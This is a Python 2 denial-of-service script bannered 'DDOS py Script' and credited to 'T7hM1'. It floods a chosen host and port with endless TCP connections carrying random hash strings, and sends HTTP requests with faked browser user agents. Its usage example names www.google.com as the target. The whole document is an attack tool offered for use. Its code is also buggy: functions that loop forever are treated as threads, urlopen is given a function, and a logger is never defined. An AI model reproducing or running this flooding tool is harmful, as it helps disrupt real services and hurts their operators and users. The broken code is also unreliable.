#!/usr/bin/python

from socket import *
from threading import *
from termcolor import colored,cprint
import hashlib
import string
import random
import Queue
import sys
import urllib2,httplib
from argparse import ArgumentParser
from fake_useragent import UserAgent

screenLock = Semaphore(value=99999999)
title = """
 _____  _____   ____   _____                  _____           _       _   
|  __ \|  __ \ / __ \ / ____|                / ____|         (_)     | |  
| |  | | |  | | |  | | (___    _ __  _   _  | (___   ___ _ __ _ _ __ | |_ 
| |  | | |  | | |  | |\___ \  | '_ \| | | |  \___ \ / __| '__| | '_ \| __|
| |__| | |__| | |__| |____) | | |_) | |_| |  ____) | (__| |  | | |_) | |_ 
|_____/|_____/ \____/|_____/  | .__/ \__, | |_____/ \___|_|  |_| .__/ \__|
                              | |     __/ |                    | |         
                              |_|    |___/                     |_|        v.1.0
                              ___T7hM1___
"""

def create_packet():
	chars = string.ascii_letters
	rand_string = ""
	for i in range(0,33):
		rand_string += str(random.randint(1,999999))
		rand_string += chars[random.randint(0,len(chars)-1)]
	return hashlib.md5(rand_string).hexdigest()

def get_ip(args):
	target = args.i
	try:
		ip = gethostbyname(target)
		print colored('[+] IP target =>','blue'),colored(ip,'red')
	except:
		sys.exit(cprint('[-] I can\'t get your target ip - Wrong host?','red'))
	return ip


def ddos(args):
	port = int(args.p)
	tgt = get_ip(args)
	while True:
		try:
			pkt=create_packet()
			sock = socket(AF_INET,SOCK_STREAM)
			sock.settimeout(1.5)
			sock.connect((tgt,port))
			sock.send(pkt)
			res = sock.recv(8).strip()
			screenLock.acquire()
			print colored('[+] Sending packet =>','green'),colored(tgt,'red'),colored(':80','green')
			sock.close()
		except KeyboardInterrupt:
			cprint('[-] Canceled by user','red')
			sys.exit(1)
		except:
			screenLock.acquire()
			cprint('[-] Can\'t sending packet,host maybe busy xD','red')
		finally:
			screenLock.release()
			sock.close()
	task1.task_done()

def get_header(args):
	try:
		conn = httplib.HTTPConnection(args.i)
		conn.request('HEAD','/index.html')
		res = conn.getresponse()
		header=res.getheaders()
	except httplib.HTTPException,e:
		checksLogger.error(colored('[-] Got exception','red',str(e)))
	return header

def request(args):
	ua = UserAgent()
	agent1 = ua.chrome
	agent2 = ua.firefox
	try:
		ip = gethostbyname(args.i)
	except:
		cprint('[-] Error,can\'t get ip address','red')
		sys.exit(0)
	try:
		name = gethostbyaddr(ip)
		name=name[0]
	except:
		name = args.i
	conn = urllib2.Request(name)
	conn.add_header('User-Agent:',agent2)
	conn.add_header('Host:',args.i)
	conn.add_header('Header:',get_header(args))
	try:
		urllib2.urlopen(request)
	except urllib2.HTTPError,e:
		sys.exit(0)
	task2.task_done()


def main():
	parser = ArgumentParser(sys.argv[0]+' -i [target] -p [port] -T [port]'
		'\nExample: '+sys.argv[0]+' -i www.google.com -p 80 -T 2000')
	parser.add_argument('-i',default=False,help='Specify your target host or domain')
	parser.add_argument('-p',default=80,help='Specify port target(default=80)')
	parser.add_argument('-T',default=False,help='Set threads for connection')
	args = parser.parse_args()
	if args.i == False or args.T == False:
		print colored(title,'cyan')
		parser.print_help()
		sys.exit(0)
	else:
		print colored(title,'cyan')
		global task1
		global task2
		task1 = Queue.Queue()
		task2 = Queue.Queue()
		while True:
			try:
				for i in range(0,int(args.T)):
					t = ddos(args)
					t.setDaemon(True)
					t.daemon=True
					t.start()
					t2 = request(args)
					t2.setDaemon(True)
					t2.daemon=True
					t2.start()
			except KeyboardInterrupt:
				sys.exit(0)
			task1.join()
			task2.join()

if __name__ == '__main__':
	main()
